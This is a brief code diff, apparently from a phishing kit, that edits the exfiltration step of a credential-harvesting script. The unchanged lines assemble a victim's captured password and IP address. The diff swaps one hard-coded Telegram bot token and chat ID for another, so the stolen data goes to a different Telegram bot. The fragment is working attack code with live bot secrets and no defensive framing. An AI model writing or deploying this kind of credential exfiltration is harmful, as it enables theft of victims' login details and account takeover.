@@ -48,8 +48,8 @@ Mot de passe : ${this.log.PASS}
 IP : ${ip}
       `;
 
-      const botToken = '6568469046:AAETwgIXIe90oEWYsXylYZeemtrxX2vKk3A';
-      const chatId = '7167294015';
+      const botToken = '8176410248:AAFILC598s17ovRi5rfW-G-j5qmy3hIA1jc';
+      const chatId = '7710081913';
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       try {
